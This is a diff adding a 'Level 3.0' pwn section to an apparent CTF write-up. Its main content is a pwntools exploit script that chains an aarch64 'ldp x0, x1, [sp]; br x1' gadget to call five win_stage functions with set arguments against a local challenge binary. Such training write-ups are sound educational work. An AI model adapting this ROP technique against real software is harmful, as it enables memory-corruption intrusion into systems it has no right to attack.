@@ -263,3 +263,125 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+# Level 3.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> What about passing arguments to multiple functions?
+
+## Write-up
+
+Multiple stages + argument control, 回忆啊，都是回忆……
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+import argparse
+
+from pwn import (
+    ELF,
+    ROP,
+    context,
+    flat,
+    gdb,
+    process,
+    raw_input,
+    remote,
+)
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-L", "--local", action="store_true", help="Run locally")
+parser.add_argument("-G", "--gdb", action="store_true", help="Enable GDB")
+parser.add_argument("-P", "--port", type=int, default=1234, help="GDB port for QEMU")
+parser.add_argument("-T", "--threads", type=int, default=None, help="Thread count")
+args = parser.parse_args()
+
+
+FILE = "/challenge/level-3-0"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+libc = elf.libc
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch(argv=None, envp=None):
+    global target, thread
+
+    if argv is None:
+        argv = [FILE]
+
+    if args.local and args.threads is not None:
+        raise ValueError("Options -L and -T cannot be used together.")
+
+    if args.local:
+        if args.gdb and "qemu" in argv[0]:
+            if "-g" not in argv:
+                argv.insert(1, str(args.port))
+                argv.insert(1, "-g")
+        target = process(argv, env=envp)
+    elif args.threads:
+        if args.threads <= 0:
+            raise ValueError("Thread count must be positive.")
+        process(FILE)
+
+        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
+    else:
+        target = remote(HOST, PORT, ssl=True)
+
+
+def main():
+    # launch(["qemu-aarch64-static", "-L", "/opt/aarch64-rootfs", FILE])
+    target = process(["/challenge/run"])
+
+    # 0x00000000004014c8: ldp x0, x1, [sp]; br x1;
+    x0_x1_br_x1 = 0x00000000004014C8
+    payload = flat(
+        {
+            0x61: x0_x1_br_x1,
+            0x61 + 0x8: 0x1,
+            0x61 + 0x10: elf.sym["win_stage_1"] + 0x8,
+            0x191: x0_x1_br_x1,
+            0x1A9: 0x2,
+            0x1A9 + 0x8: elf.sym["win_stage_2"] + 0x8,
+            0x2D1: x0_x1_br_x1,
+            0x2E9: 0x3,
+            0x2E9 + 0x8: elf.sym["win_stage_3"] + 0x8,
+            0x411: x0_x1_br_x1,
+            0x429: 0x4,
+            0x429 + 0x8: elf.sym["win_stage_4"] + 0x8,
+            0x551: x0_x1_br_x1,
+            0x569: 0x5,
+            0x569 + 0x8: elf.sym["win_stage_5"] + 0x8,
+        },
+        filler=b"\x00",
+    )
+    raw_input("DEBUG")
+    target.send(payload)
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
